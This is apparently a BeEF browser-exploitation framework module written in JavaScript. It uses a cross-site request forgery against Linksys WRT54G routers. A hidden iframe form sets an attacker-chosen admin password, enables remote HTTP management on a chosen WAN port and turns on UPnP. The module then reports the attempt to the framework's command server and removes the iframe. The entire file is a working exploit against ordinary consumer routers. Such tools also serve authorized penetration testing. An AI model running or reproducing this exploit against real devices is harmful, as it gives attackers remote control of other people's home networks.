//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var port = '<%= @port %>';
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var wrt54g_iframe = beef.dom.createIframeXsrfForm(gateway + "manage.tri", "POST",
      [{'type':'hidden', 'name':'remote_mgt_https', 'value':'0'} ,
          {'type':'hidden', 'name':'http_enable', 'value':'1'},
          {'type':'hidden', 'name':'https_enable', 'value':'0'},
          {'type':'hidden', 'name':'PasswdModify', 'value':'1'},
          {'type':'hidden', 'name':'http_passwd', 'value':passwd},
          {'type':'hidden', 'name':'http_passwdConfirm', 'value':passwd},
          {'type':'hidden', 'name':'_http_enable', 'value':'1'},
          {'type':'hidden', 'name':'remote_management', 'value':'1'},
          {'type':'hidden', 'name':'web_wl_filter', 'value':'1'},
          {'type':'hidden', 'name':'http_wanport', 'value':port},
          {'type':'hidden', 'name':'upnp_enable', 'value':'1'},
          {'type':'hidden', 'name':'layout', 'value':'en'}
      ]);

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(wrt54g_iframe);
  }
  setTimeout("cleanup()", 15000);

});

